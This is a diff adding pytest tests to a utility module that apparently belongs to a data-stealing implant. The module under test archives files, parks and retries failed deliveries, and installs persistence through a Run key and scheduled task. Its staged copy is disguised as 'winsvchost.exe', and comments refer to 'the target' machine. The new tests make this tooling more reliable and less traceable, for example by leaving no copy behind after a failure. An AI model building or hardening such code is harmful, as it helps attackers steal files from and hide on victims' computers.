@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import os
 import sys
+import zipfile
 from pathlib import Path
 
 import pytest
@@ -129,6 +130,28 @@ def test_write_text_creates_the_folder(tmp_path: Path) -> None:
     assert target.read_text(encoding="utf-8") == "hello"
 
 
+# --- archive writer ---------------------------------------------------------
+
+
+def test_a_member_larger_than_one_chunk_survives_the_streamed_write(
+    tmp_path: Path,
+) -> None:
+    # The writer streams each file instead of reading it into bytes first, so the case
+    # worth pinning is a member that spans several blocks: it has to arrive whole and
+    # the central directory has to carry a matching checksum.
+    tree = tmp_path / "tree"
+    tree.mkdir()
+    payload = os.urandom(3 * 1024 * 1024 + 17)
+    (tree / "big.bin").write_bytes(payload)
+
+    archive = util.make_archive(tree, tmp_path / "out.zip")
+
+    assert archive is not None
+    with zipfile.ZipFile(archive) as opened:
+        assert opened.testzip() is None, "a streamed member failed its own crc"
+        assert opened.read("big.bin") == payload
+
+
 # --- encrypted archive ------------------------------------------------------
 
 
@@ -233,6 +256,44 @@ def test_a_parked_archive_is_listed_until_it_is_dropped(
     assert util.pending_queue() == []
     assert not parked.exists()
     assert not parked.with_suffix(".json").exists()
+
+
+def test_dropping_a_journal_that_is_a_folder_does_not_raise(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    # The trim loop calls this *after* a new archive has been parked and journalled, so
+    # an exception here used to escape into park_archive's handler and report that
+    # nothing had been parked while the archive sat on disk with no retry task.
+    folder = parked_folder(monkeypatch, tmp_path)
+    parked = folder / "pending" / "stuck.zip"
+    parked.parent.mkdir(parents=True)
+    parked.write_bytes(b"x")
+    journal = parked.with_suffix(".json")
+    journal.mkdir()
+    (journal / "held.txt").write_text("a directory where a file belongs", encoding="utf-8")
+
+    util.drop_pending(parked)
+
+    assert not parked.exists()
+
+
+def test_a_journal_with_an_unreadable_count_still_counts(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    # The journal is a file on a machine this run does not control. A string where the
+    # count belongs used to raise out of bump_pending, which is called from the handler
+    # that is already reporting a failed delivery.
+    parked_folder(monkeypatch, tmp_path)
+    source = tmp_path / "payload.zip"
+    source.write_bytes(b"x" * 64)
+    parked = util.park_archive(source)
+    assert parked is not None
+    util.write_json(
+        parked.with_suffix(".json"), {"archive": parked.name, "attempts": "lots"}
+    )
+
+    assert util.bump_pending(parked) == 1
+    assert util.read_json(parked.with_suffix(".json"))["attempts"] == 1
 
 
 def test_a_zip_without_a_journal_is_not_trusted(
@@ -383,6 +444,45 @@ def test_a_run_key_that_cannot_be_written_is_a_failure_not_a_success(
     image.write_bytes(b"MZ")
 
     assert util.install_persistence(image, 0) is None
+
+
+def test_an_unregistered_copy_is_not_left_on_the_disk(
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    # Nothing runs a staged image with no Run value and no task, and no cleanup path
+    # knows about it. A failure has to leave the profile as it found it.
+    folder = staged_folder(monkeypatch, tmp_path)
+    record_run_key(monkeypatch, verdict=False)
+    record_tasks(monkeypatch)
+
+    image = tmp_path / "artifact.exe"
+    image.write_bytes(b"MZ" + bytes(256))
+
+    assert util.install_persistence(image, 0) is None
+    assert not (folder / "winsvchost.exe").exists()
+
+
+def test_the_task_tool_is_named_by_absolute_path(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    # An elevated run that resolves "schtasks" off PATH runs whatever the target put
+    # there. The name has to be a full path to the system copy.
+    seen: list[list[str]] = []
+
+    class Done:
+        returncode = 0
+        stderr = b""
+
+    def fake(argv: list[str], **_: object) -> Done:
+        seen.append(argv)
+        return Done()
+
+    monkeypatch.setattr(util.subprocess, "run", fake)
+
+    assert util._schtasks(["/query"]) is True
+    assert seen, "the tool was never launched"
+    assert os.path.isabs(seen[0][0]), seen[0][0]
+    assert seen[0][0].lower().endswith("schtasks.exe"), seen[0][0]
 
 
 def test_persistence_adds_a_timer_when_hours_are_set(
